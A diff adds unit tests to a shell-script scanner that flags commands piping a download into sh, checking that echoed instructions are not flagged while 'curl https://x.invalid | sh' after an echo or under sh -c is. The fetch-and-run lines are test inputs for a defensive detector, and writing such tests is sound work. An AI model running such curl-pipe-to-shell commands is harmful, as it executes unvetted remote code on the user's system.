@@ -52,6 +52,19 @@ class TestDownloads(unittest.TestCase):
     def test_a_pipe_from_something_local_is_not_a_download(self):
         self.assertEqual(scan("cat script.sh | sh\n"), [])
 
+    def test_an_echoed_instruction_is_not_an_installation(self):
+        # A script telling somebody how to install Rust looks exactly like a
+        # script installing it. The difference is the quotes and the echo.
+        # This was a false positive in the GitLab runner repository.
+        line = 'echo "  Install Rust: curl --proto \'=https\' -sSf https://sh.rustup.rs | sh"'
+        self.assertEqual(scan(line + "\n"), [])
+
+    def test_a_command_that_merely_follows_an_echo_still_counts(self):
+        self.assertIn("SH001", rule_ids(scan('echo "installing" && curl https://x.invalid | sh\n')))
+
+    def test_sh_dash_c_is_not_printing(self):
+        self.assertIn("SH001", rule_ids(scan('sh -c "curl https://x.invalid | sh"\n')))
+
     def test_a_commented_out_command_is_somebody_deciding_against_it(self):
         self.assertEqual(scan("# curl -sSL https://x.invalid/i.sh | sh\n"), [])
 
